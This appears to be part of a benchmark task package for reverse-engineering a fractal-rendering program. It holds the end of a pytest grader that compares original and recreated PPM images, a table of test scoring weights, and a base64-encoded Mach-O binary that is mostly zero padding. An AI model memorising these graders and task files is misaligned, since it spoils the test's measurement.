        assert result.returncode == 0, f""Recreated failed for type {fractal_type}""
        os.rename('fractal.ppm', 'recreated.ppm')
        
        # Compare
        mse = compare_images('original.ppm', 'recreated.ppm')
        assert mse < 0.01, f""Type {fractal_type} differs: MSE = {mse}""

def test_color_mapping_accuracy():
    """"""Test that color mapping algorithm is correctly reproduced.""""""
    # Test with high iteration count for detailed color mapping
    for f in ['fractal.ppm', 'original.ppm', 'recreated.ppm']:
        if os.path.exists(f):
            os.remove(f)
    
    # Generate detailed Mandelbrot with many colors
    subprocess.run(['./fractal', '1', '256', '4.0'], capture_output=True)
    os.rename('fractal.ppm', 'original.ppm')
    
    subprocess.run(['./fractal_recreated', '1', '256', '4.0'], capture_output=True)
    os.rename('fractal.ppm', 'recreated.ppm')
    
    # Check pixel-perfect color matching
    orig_img = read_ppm('original.ppm')
    rec_img = read_ppm('recreated.ppm')
    
    # Calculate maximum pixel difference
    max_diff = np.max(np.abs(orig_img.astype(int) - rec_img.astype(int)))
    assert max_diff <= 2, f""Color mapping differs by up to {max_diff} levels""","{""test_mandelbrot_generation"": 0.4, ""test_julia_and_burning_ship"": 0.4, ""test_color_mapping_accuracy"": 0.2}","{""fractal.b64"": ""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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA